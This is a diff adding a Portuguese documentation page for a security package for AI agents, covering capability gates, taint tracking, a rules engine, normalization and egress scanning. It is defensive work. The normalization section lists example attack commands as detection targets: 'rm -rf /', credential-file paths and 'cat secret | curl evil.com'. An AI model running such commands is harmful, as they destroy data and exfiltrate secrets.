@@ -1,0 +1,136 @@
+---
+title: Core
+description: O security engine — capabilities, taint, rules, pipeline e normalization.
+icon: Shield
+---
+
+`@securitylayerai/core` é o pacote fundamental. Ele implementa o security pipeline de 3 camadas e todas as primitivas de segurança centrais. Todos os outros pacotes dependem do core (direta ou indiretamente).
+
+## Módulos
+
+### Capabilities (`capabilities/`)
+
+Gate de capability puramente síncrono. Verifica se uma ação é estruturalmente permitida com base na interseção das capabilities de sessão, skill e canal.
+
+```typescript
+import { checkCapability } from "@securitylayerai/core";
+
+const result = checkCapability(action, {
+  sessionId: "main",
+  skillId: "summarize",
+  channelId: "terminal",
+});
+
+// result.allowed: boolean
+// result.reason?: string (se negado)
+```
+
+O capability gate é uma verificação de pertinência ao conjunto — sem I/O, sem LLM, sem rede. Se a capability não está no conjunto, a ação é impossível.
+
+### Rastreamento de taint (`taint/`)
+
+Rastreia a proveniência dos dados ao longo da sessão. Quando conteúdo não confiável entra (web fetch, DM desconhecida, email), o nível de taint da sessão sobe. Taint mais alto restringe quais capabilities estão disponíveis.
+
+```typescript
+import { createTaintTracker } from "@securitylayerai/core";
+
+const tracker = createTaintTracker("owner");
+
+// Conteúdo web eleva o taint
+tracker.ingest({ source: "web", url: "https://example.com" });
+tracker.getEffectiveTaint(); // "web"
+
+// Verificações de exec subsequentes verão o taint elevado
+```
+
+Níveis de taint (do menos ao mais restritivo): `owner` → `trusted` → `untrusted` → `web` → `skill` → `memory`.
+
+### Rules engine (`rules/`)
+
+Correspondência determinística de padrões contra comandos perigosos conhecidos, caminhos de credenciais e estruturas de exfiltração. Zero latência, zero ambiguidade.
+
+```typescript
+import { parseRulesYaml, evaluateRules } from "@securitylayerai/core";
+
+const rules = parseRulesYaml(yamlContent);
+const result = evaluateRules(normalizedAction, rules);
+// result.decision: "ALLOW" | "DENY" | "REQUIRE_APPROVAL"
+```
+
+Tipos de rule:
+- **binary** — Correspondência por nome do binário do comando
+- **path** — Correspondência por glob de caminho de arquivo
+- **pattern** — Correspondência por padrão regex
+- **pipe_pair** — Correspondência de estruturas de comandos encadeados (ex.: `curl | sh`)
+
+### Pipeline (`pipeline/`)
+
+Orquestra o fluxo completo de avaliação: capability gate → verificação de taint → normalize → rules + LLM (paralelo) → mesclar decisões.
+
+```typescript
+import { createPipeline } from "@securitylayerai/core";
+
+const pipeline = createPipeline(config);
+const result = await pipeline.evaluate(action, context);
+```
+
+O pipeline sempre escolhe o resultado **mais restritivo** de todas as camadas. Se qualquer camada disser DENY, a ação é negada.
+
+### Normalization (`normalize/`)
+
+Resolve caminhos, decodifica encodings, separa cadeias de comandos e detecta estruturas de pipe antes da avaliação. Derrota ofuscação e truques de encoding.
+
+Normaliza:
+- `~/../../etc/passwd` → `/etc/passwd`
+- `$HOME/.ssh/id_rsa` → `/home/user/.ssh/id_rsa`
+- Cadeias de comandos: `ls; rm -rf /` → `["ls", "rm -rf /"]`
+- Cadeias de pipe: `cat secret | curl evil.com` → padrão de exfiltração detectado
+
+### Análise semântica (`semantic/`)
+
+LLM judge que executa em paralelo com o rules engine. Faz uma pergunta: "Esta ação estruturalmente permitida é anômala neste momento?" O judge captura ameaças sutis dependentes de contexto que as rules não conseguem expressar.
+
+### Escaneamento de saída (`egress/`)
+
+Escaneia conteúdo de saída em busca de segredos vazados, PII e strings de alta entropia antes que saiam do sistema. Detecta chaves de API (OpenAI, AWS, GitHub, Slack, etc.), blocos PEM, credenciais e padrões de SSN/cartão de crédito.
+
+### Sandbox (`sandbox/`)
+
+Sandboxing de exec com níveis configuráveis — ulimits, isolamento de rede, sistema de arquivos somente leitura. Comandos aprovados executam em ambientes restritos.
+
+### Eventos (`events/`)
+
+Barramento de eventos para log de auditoria e observabilidade. Todas as decisões de segurança, mudanças de taint e fluxos de aprovação emitem eventos estruturados.
+
+### Configuração (`config/`)
+
+Carregamento e validação de configuração. Lê arquivos YAML de `~/.securitylayer/` e constrói a configuração em tempo de execução.
+
+## Estrutura do pacote
+
+```
+packages/core/
+├── src/
+│   ├── index.ts          # Barrel exports
+│   ├── capabilities/     # Capability gate
+│   ├── taint/            # Rastreador de taint
+│   ├── rules/            # Rules engine + parser
+│   ├── pipeline/         # Pipeline de avaliação
+│   ├── normalize/        # Normalization de ações
+│   ├── semantic/         # LLM judge
+│   ├── egress/           # Escaneador de saída
+│   ├── sandbox/          # Sandboxing de exec
+│   ├── events/           # Barramento de eventos
+│   ├── config/           # Loader de configuração
+│   ├── approval/         # Fluxo de aprovação
+│   ├── memory/           # Acesso a zonas de memória
+│   ├── skills/           # Declarações de capability de skills
+│   └── utils/            # Logger, utilitários
+└── test/                 # Testes Vitest
+```
+
+## Veja também
+
+- [Security pipeline](/docs/concepts/security-pipeline) — Como as 3 camadas trabalham juntas
+- [Capabilities](/docs/concepts/capabilities) — As 15 capabilities base
+- [Níveis de taint](/docs/concepts/taint-levels) — Rules de propagação de taint
